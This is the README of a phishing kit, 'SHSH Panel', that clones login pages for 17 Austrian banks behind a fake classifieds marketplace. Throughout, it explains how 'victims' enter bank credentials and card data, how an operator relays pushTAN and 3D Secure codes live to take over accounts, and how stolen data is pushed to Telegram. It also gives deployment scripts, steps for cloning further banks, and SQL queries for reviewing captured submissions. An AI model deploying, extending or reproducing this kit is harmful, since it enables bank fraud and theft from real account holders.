# SHSH Panel — Austrian Bank Session Management System

Complete turnkey solution for managing Austrian bank login pages with a real-time operator console, Telegram alerts, and credit card processing. 17 banks, one panel, zero headaches.

---

## Table of Contents

1. [What's Inside](#whats-inside)
2. [The Flow](#the-flow)
3. [Operator Console](#operator-console)
4. [Credit Cards](#credit-cards)
5. [Admin Panel](#admin-panel)
6. [Bank Pages — Port Map](#bank-pages--port-map)
7. [Telegram Alerts](#telegram-alerts)
8. [Settings](#settings)
9. [Adding a New Bank](#adding-a-new-bank)
10. [Useful Commands](#useful-commands)
11. [Troubleshooting](#troubleshooting)
12. [Tech Stack](#tech-stack)

---

## What's Inside

```
shsh_final/
├── shsh-panel/              # Admin panel + API (Next.js)
│   ├── src/
│   │   └── app/
│   │       ├── api/         # All API routes
│   │       │   ├── banks/           # Bank CRUD + session management
│   │       │   ├── events/          # SSE / polling endpoint
│   │       │   ├── settings/        # Telegram, domain, toggles
│   │       │   ├── address-templates/  # Reusable address snippets
│   │       │   └── listings/        # Listing CRUD
│   │       ├── operator/    # Real-time operator console
│   │       │   └── cards/   # Credit card sessions tab
│   │       ├── banks/       # Bank management UI + submissions list
│   │       ├── dashboard/   # Stats overview
│   │       ├── listings/    # Listing management
│   │       ├── chat/        # Per-listing live chat
│   │       └── settings/    # Panel settings UI
│   ├── site/                # Marketplace clone (victim landing pages)
│   └── prisma/              # DB schema + migrations
│       └── schema.prisma
├── banks/                   # 17 individual bank apps (Next.js)
│   ├── raiffeisen-login/
│   ├── vkb-login/
│   ├── oberbank-login/
│   ├── bank99-login/
│   ├── hypo-login/
│   ├── austria-next/
│   ├── burgenland-next/     # 4-step flow (has password screen)
│   ├── hypo-vorarlberg-next/ # 4-step flow
│   ├── hyponoe-next/        # 4-step flow
│   ├── hypotirol-next/      # 4-step flow
│   ├── mypaylife-next/
│   ├── poso-next/
│   ├── volks-next/          # 4-step flow
│   ├── bawag-next/
│   ├── easybank-next/
│   ├── sparkasse-next/
│   └── bks-next/
├── database/                # PostgreSQL dump (ready to restore)
├── configs/
│   ├── nginx/               # Full nginx config with all bank locations
│   └── pm2/                 # PM2 process dump (dump.pm2)
├── deploy.sh                # One-click deployment script
└── README.md
```

---

## The Flow

### How a victim goes through the system

#### Standard 3-step flow (12 banks)

```
Listing Page
     |
     v
Bank Picker (or Credit Card form)
     |
     v
[1] LOGIN PAGE       <-- victim enters credentials
     |
     | trackSubmission() fires → session created in operator panel
     v
[2] WAITING SCREEN   <-- "Ihre Daten werden uberpruft..."
     |                   operator sees session live
     | operator clicks "Forward to PushTAN" + enters Vergleichswert code
     v
[3] PUSHTAN SCREEN   <-- victim confirms TAN in their banking app
     |
     | victim submits TAN code → operator sees it
     | operator: Accept (redirect) or Reject (wrong code / retry)
     v
Redirect to success URL / real bank website
```

Banks on the standard flow: raiffeisen, vkb, oberbank, bank99, hypo-login, bank-austria, mypaylife, poso, bawag, easybank, sparkasse, bks

#### 4-step flow (5 banks)

These banks split the login form into two screens — username first, then password on the next screen. This matches the real bank UX exactly.

```
[1a] USERNAME SCREEN   <-- victim enters account number / Verfueger
     |
     v
[1b] PASSWORD SCREEN   <-- victim enters PIN / password
     |
     | trackSubmission() fires with full {username, password}
     v
[2]  WAITING SCREEN
     v
[3]  PUSHTAN SCREEN
```

Banks on 4-step flow: **burgenland**, **hypo-vorarlberg**, **hypo-noe**, **hypotirol**, **volksbank**

---

### How the marketplace site connects to banks

The `site/` subdirectory runs a fake marketplace (classifieds/ads clone). Listings are managed from the panel. When a victim clicks "Geld erhalten" on a listing:

1. They pick a payment method — **Bankuberweisung** or **Kreditkarte**
2. If bank transfer: they see a bank picker with all enabled banks + logos
3. They select a bank → redirected to `http://SERVER/{bank-slug}/{listing-slug}`
4. The listing slug is threaded through the entire flow so the operator knows which listing triggered the session

---

## Operator Console

URL: `/operator`

This is mission control. Every active bank session appears here in real time (2-second polling). Each session card shows:

- Session short code (e.g. `#0042`)
- Bank name + logo
- IP address
- Submitted credentials (username, PIN, etc.)
- Current step (login / waiting / pushtan)
- TAN code when submitted
- Timestamp

### Commands

| Command | What it does |
|---------|-------------|
| **Forward to PushTAN** | Moves victim to the PushTAN screen. You type in the Vergleichswert code (e.g. `AB99`) — victim sees exactly that code in their banking app |
| **Back to Login** | Sends victim back to the login form. Useful when creds look fake |
| **Show Error** | Displays a custom error message on whatever screen the victim is on right now |
| **Clear Error** | Removes the error message you just showed |
| **Reject TAN** | Shows "TAN nicht korrekt" on the PushTAN screen |
| **Wrong code, retry** | Resets the TAN input and restarts the countdown timer — asks victim to enter a new code |
| **Redirect** | Sends victim to any URL you specify (e.g. real bank site, success page) |
| **Close Session** | Marks session as closed and removes it from the active list |

### How commands reach the victim

The bank pages poll `/api/banks/[slug]/session` every 2 seconds. When you issue a command, it sets `pendingCommand` on the session. The next poll picks it up and the victim's page reacts immediately.

---

## Credit Cards

URL: `/operator/cards`

When a victim chooses Kreditkarte instead of Bankuberweisung, they fill out a card form (number, expiry, CVC, name). This creates a separate card session that shows up in the **Credit Cards** tab, not the main operator console.

### What you see in the cards tab

- Masked card number (e.g. `**** **** **** 4242`) with a toggle to reveal the full number
- Cardholder name
- Expiry date
- CVC
- IP address
- Timestamp

### Card session flow

```
Card Form → [Waiting Screen] → [PushTAN / 3D Secure]
```

Same command set applies — you can forward to PushTAN (to capture the 3D Secure code), show errors, or redirect.

### Toggling credit card globally

In `/banks`, there's a global **Kreditkarte** toggle. When off, the credit card option disappears from the listing payment picker entirely. Per-bank control is also available.

---

## Admin Panel

### Login

- URL: `http://SERVER/login` (via nginx on port 80) or `http://SERVER:8500/login` (direct)
- Default credentials: `admin` / `admin123`
- Change the password after first login

### Pages

| Page | Path | What it does |
|------|------|-------------|
| Dashboard | `/dashboard` | Stats — total listings, published count, total value |
| Listings | `/listings` | All listings with status (draft/published), price, edit/delete |
| New Listing | `/listings/new` | Create listing — title, price, images, seller info, redirect URLs |
| Chat | `/chat` | Live chat per listing — messages from victims, send replies |
| Banks | `/banks` | Enable/disable individual banks, toggle Kreditkarte option, global bank toggle |
| Bank Submissions | `/banks/submissions` | Raw submission log — every credential set ever submitted |
| Operator Console | `/operator` | Live bank sessions with full command set |
| Credit Cards | `/operator/cards` | Live card sessions with masked display |
| Settings | `/settings` | Telegram config, domain, API keys |

### Address Templates

Available under Settings → Address Templates. Pre-save addresses (name, street, city) so you can paste them into listings quickly without retyping the same seller address every time.

---

## Bank Pages — Port Map

All banks sit behind nginx. You never expose bank ports directly — nginx handles routing by path prefix.

| Bank | PM2 Name | Port | Path prefix | Example URL |
|------|----------|------|-------------|-------------|
| Panel | `panel` | 8500 | `/` | `http://SERVER/` |
| Listing Site | `site` | 3001 | — | `http://SERVER:3001` |
| VKB | `vkb` | 3010 | `/vkb` | `http://SERVER/vkb/{slug}` |
| Oberbank | `oberbank` | 3011 | `/oberbank` | `http://SERVER/oberbank/{slug}` |
| Bank99 | `bank99` | 3012 | `/bank99` | `http://SERVER/bank99/{slug}` |
| Hypo (generic) | `hypo` | 3013 | `/hypobank` | `http://SERVER/hypobank/{slug}` |
| Raiffeisen | `raiffeisen` | 3014 | `/raiffeisen` | `http://SERVER/raiffeisen/{slug}` |
| Bank Austria | `bank-austria` | 3015 | `/bank-austria` | `http://SERVER/bank-austria/{slug}` |
| Burgenland | `burgenland` | 3016 | `/burgenland` | `http://SERVER/burgenland/{slug}` |
| Hypo Vorarlberg | `hypo-vorarlberg` | 3017 | `/hypo-vorarlberg` | `http://SERVER/hypo-vorarlberg/{slug}` |
| Hypo NOE | `hypo-noe` | 3018 | `/hypo-noe` | `http://SERVER/hypo-noe/{slug}` |
| Hypo Tirol | `hypotirol` | 3019 | `/hypotirol` | `http://SERVER/hypotirol/{slug}` |
| Mypaylife | `mypaylife` | 3020 | `/mypaylife` | `http://SERVER/mypaylife/{slug}` |
| Poso | `poso` | 3021 | `/poso` | `http://SERVER/poso/{slug}` |
| Volksbank | `volksbank` | 3022 | `/volksbank` | `http://SERVER/volksbank/{slug}` |
| BAWAG | `bawag` | 3023 | `/bawag` | `http://SERVER/bawag/{slug}` |
| easybank | `easybank` | 3024 | `/easybank` | `http://SERVER/easybank/{slug}` |
| Sparkasse | `sparkasse` | 3025 | `/sparkasse` | `http://SERVER/sparkasse/{slug}` |
| BKS | `bks` | 3026 | `/bks` | `http://SERVER/bks/{slug}` |

All banks have real SVG/PNG logos. Logos are served as static assets from each bank's `public/` folder, loaded via the `assetPrefix` set in `next.config.ts`.

---

## Deployment

### Requirements

- Ubuntu 24.04 LTS
- 4+ vCPU, 8+ GB RAM, 80+ GB SSD
- Root access

### One-click deploy

```bash
# Upload the project to your server
scp -r shsh_final/ root@YOUR_SERVER:/root/shsh_final/

# SSH in
ssh root@YOUR_SERVER
cd /root/shsh_final

# Run it
chmod +x deploy.sh
./deploy.sh
```

The script installs Node.js, PM2, nginx, PostgreSQL, restores the database, builds everything, and starts all processes. Takes about 10-15 minutes on a fresh server.

### Manual deploy

```bash
# 1. Install system deps
apt update && apt install -y nginx postgresql postgresql-contrib nodejs npm
npm install -g pm2

# 2. Restore DB
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';"
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;"
sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel database/shsh_panel_final.dump

# 3. Copy files
cp -R shsh-panel /opt/shsh-panel
cp -R banks /opt/banks

# 4. Panel .env
cat > /opt/shsh-panel/.env <<EOF
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="change-this-to-a-random-64-char-string"
NEXTAUTH_URL="http://YOUR_SERVER_IP:8500"
NEXT_PUBLIC_SITE_URL="http://YOUR_SERVER_IP:3001"
EOF

# 5. Bank .env files (set panel URL for all banks at once)
for dir in /opt/banks/*/; do
  echo 'NEXT_PUBLIC_PANEL_URL=http://YOUR_SERVER_IP:8500' > "$dir/.env"
done

# 6. Build panel
cd /opt/shsh-panel
npm install
npx prisma generate
npm run build

# 7. Build banks (takes a while)
for dir in /opt/banks/*/; do
  cd "$dir" && npm install && npm run build
done

# 8. Restore PM2 processes
cd /root/shsh_final
pm2 restore configs/pm2/dump.pm2
pm2 save
pm2 startup

# 9. nginx
cp configs/nginx/sites-enabled/shsh-panel /etc/nginx/sites-enabled/shsh-panel
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl reload nginx
```

---

## Telegram Alerts

Every submission (login credentials, TAN codes, card data) triggers a Telegram message instantly.

### Example notification format

```
🏦 Raiffeisen — login
📦 iPhone 15 Pro Max — 649€
🌐 IP: 203.0.113.42 | AT

verfueger: 12345678
pin: mysecretpin
```

```
🔐 Raiffeisen — pushtan
📦 iPhone 15 Pro Max — 649€
🌐 IP: 203.0.113.42 | AT

tan: 123456
```

```
💳 Kreditkarte
📦 iPhone 15 Pro Max — 649€
🌐 IP: 203.0.113.42 | AT

card: 4111 1111 1111 1234
expiry: 09/27
cvc: 123
name: Max Mustermann
```

### Setup

1. Talk to **@BotFather** on Telegram → `/newbot` → copy the token
2. Talk to **@userinfobot** → copy your Chat ID
3. Open the panel → **Settings** → paste both values → Save

### Test your bot

```bash
curl -s "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage" \
  -d "chat_id=YOUR_CHAT_ID&text=test+from+server"
```

If you get `{"ok":true,...}` you're good.

---

## Settings

All configuration lives at `/settings` in the panel. Here's what each field does:

| Setting | Description |
|---------|-------------|
| **Telegram Bot Token** | Token from @BotFather. Format: `123456:ABCdef...` |
| **Telegram Chat ID** | Your personal chat ID (integer). Can be a group chat ID if you want alerts in a group |
| **External Domain** | The public-facing domain or IP. Used for building listing share links |
| **Banks Globally Enabled** | Master switch — when off, no bank picker shows anywhere on the site |
| **Credit Card Enabled** | Master switch — when off, Kreditkarte option disappears site-wide |

Per-bank toggles (enable/disable individual banks, maintenance mode) are on the `/banks` page.

---

## Adding a New Bank

Let's say you're adding **Erste Bank** on port 3027.

### Step 1 — Create the Next.js project

```bash
cd /opt/banks
npx create-next-app@latest erste-next --typescript --tailwind --app --no-src-dir
cd erste-next
```

### Step 2 — Configure next.config.ts

```ts
const nextConfig = {
  basePath: '/erste',
  assetPrefix: '/erste',
  output: 'standalone',
};
export default nextConfig;
```

### Step 3 — Add the tracking lib

Copy `lib/track.ts` from any existing bank (e.g. `bawag-next/lib/track.ts`). No changes needed — it reads `NEXT_PUBLIC_PANEL_URL` from env automatically.

### Step 4 — Build the pages

You need four things:

**`components/ClientShell.tsx`** — Starts the session on page load:
```ts
useEffect(() => { startSession("erste"); }, []);
```

**`components/LoginForm.tsx`** — Collects credentials:
```ts
await trackSubmission("erste", "login", { username, pin });
```

**`app/[[...slug]]/page.tsx`** — Catch-all route that renders ClientShell + LoginForm

**`app/waiting/page.tsx`** — Imports WaitingScreen (copy from any existing bank)

**`app/pushtan/page.tsx`** — Imports PushTanForm (copy from any existing bank)

If you want the 4-step login (username screen → password screen → waiting → pushtan), copy the LoginForm pattern from `burgenland-next` or `volks-next`.

### Step 5 — Add to the database

```sql
INSERT INTO "Bank" (id, slug, name, logo, "urlTemplate", enabled, "order", "createdAt", "updatedAt")
VALUES (
  gen_random_uuid(),
  'erste',
  'Erste Bank',
  '/erste/logo.svg',
  '/erste/{slug}',
  true,
  18,
  NOW(),
  NOW()
);
```

### Step 6 — Set the .env

```bash
echo 'NEXT_PUBLIC_PANEL_URL=http://YOUR_SERVER_IP:8500' > /opt/banks/erste-next/.env
```

### Step 7 — Build

```bash
cd /opt/banks/erste-next
npm install && npm run build
```

### Step 8 — Add to PM2

```bash
pm2 start npm --name erste -- start -- -p 3027
pm2 save
```

### Step 9 — Add to nginx

Add this block to `/etc/nginx/sites-enabled/shsh-panel` (before the catch-all `location /` block):

```nginx
location /erste {
    proxy_pass http://127.0.0.1:3027;
    proxy_http_version 1.1;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

```bash
nginx -t && systemctl reload nginx
```

Done. Enable the bank in the panel at `/banks`.

---

## Useful Commands

### PM2

```bash
# See all running processes and their status
pm2 list

# View logs for a specific process (live tail)
pm2 logs panel
pm2 logs bawag
pm2 logs sparkasse

# View last 200 lines without tailing
pm2 logs panel --lines 200 --nostream

# Restart a single process
pm2 restart panel
pm2 restart raiffeisen

# Restart everything
pm2 restart all

# Hard reload (zero-downtime for cluster mode)
pm2 reload all

# Save current process list (so it survives reboots)
pm2 save

# Check PM2 startup hook is installed
pm2 startup
```

### nginx

```bash
# Test config for syntax errors
nginx -t

# Reload config without dropping connections
systemctl reload nginx

# Full restart (drops connections briefly)
systemctl restart nginx

# Check status
systemctl status nginx

# View nginx error log
tail -f /var/log/nginx/error.log
tail -f /var/log/nginx/access.log
```

### PostgreSQL

```bash
# Open psql prompt
sudo -u postgres psql -d shsh_panel

# View all active bank sessions
sudo -u postgres psql -d shsh_panel -c '
  SELECT bs."shortCode", b.name, bs."currentStep", bs.ip, bs."createdAt"
  FROM "BankSession" bs
  JOIN "Bank" b ON bs."bankId" = b.id
  WHERE bs."closedAt" IS NULL
  ORDER BY bs."createdAt" DESC;
'

# View all submissions for a specific bank
sudo -u postgres psql -d shsh_panel -c '
  SELECT bs.type, bs.data, bs."createdAt"
  FROM "BankSubmission" bs
  JOIN "Bank" b ON bs."bankId" = b.id
  WHERE b.slug = '\''raiffeisen'\''
  ORDER BY bs."createdAt" DESC
  LIMIT 50;
'

# Count sessions by bank
sudo -u postgres psql -d shsh_panel -c '
  SELECT b.name, COUNT(*) as sessions
  FROM "BankSession" bs
  JOIN "Bank" b ON bs."bankId" = b.id
  GROUP BY b.name
  ORDER BY sessions DESC;
'

# Backup the DB
sudo -u postgres pg_dump -Fc shsh_panel > /root/backup_$(date +%Y%m%d).dump

# Restore from backup
sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel /root/backup_20241201.dump
```

### Rebuilding a bank after code changes

```bash
cd /opt/banks/bawag-next
npm run build
pm2 restart bawag
```

---

## Troubleshooting

### Bank page shows "Failed to fetch" or CORS errors

The `NEXT_PUBLIC_PANEL_URL` in the bank's `.env` is wrong. It must point to the actual IP/domain where the panel is accessible.

```bash
cat /opt/banks/raiffeisen-login/.env
# Should show: NEXT_PUBLIC_PANEL_URL=http://YOUR_SERVER_IP:8500
```

Fix it, rebuild, and restart.

### Session not appearing in Operator Console

1. Open the bank page in browser, open DevTools → Network tab
2. Look for requests to `/api/banks/[slug]/session` — check for 4xx/5xx errors
3. If 404: the bank slug in the code doesn't match the `slug` column in the `Bank` table
4. If 500: check `pm2 logs panel`

### Telegram not sending alerts

Test the bot manually:

```bash
curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=hello"
```

Common issues:
- Bot token has a typo — copy it again from BotFather
- Chat ID is wrong — use @userinfobot or @RawDataBot
- You never sent the bot a message first — start a chat with the bot before it can message you

### Panel login returns 401 / redirect loop

`NEXTAUTH_URL` in `/opt/shsh-panel/.env` must exactly match the URL you're hitting in the browser. If you're accessing via IP, it should be `http://IP:8500`. If via domain, it should be `http://domain`.

```bash
# After fixing .env:
cd /opt/shsh-panel && npm run build
pm2 restart panel
```

### PM2 process keeps crashing

```bash
pm2 logs PROCESS_NAME --lines 50 --nostream
```

99% of the time it's either a build issue (run `npm run build` again) or a missing `.env` file.

### nginx 502 Bad Gateway

The upstream process isn't running. Check:

```bash
pm2 list
# Is the process online? If not:
pm2 restart PROCESS_NAME
```

### Port already in use

```bash
lsof -i :3023   # find what's using port 3023
kill -9 PID
pm2 restart bawag
```

### After server reboot, nothing starts

PM2 startup wasn't configured:

```bash
pm2 startup   # follow the printed command
pm2 save
```

---

## Tech Stack

| Layer | Tech |
|-------|------|
| Framework | Next.js (App Router), React 19 |
| Styling | Tailwind CSS |
| ORM | Prisma |
| Database | PostgreSQL 16 |
| Auth | NextAuth.js (credentials provider) |
| Process manager | PM2 |
| Reverse proxy | Nginx |
| Real-time updates | HTTP polling (2s interval) |
| Language | TypeScript throughout |
| Runtime | Node.js 20+ |
| OS | Ubuntu 24.04 LTS |

---

*17 banks. One panel. Ship it.*
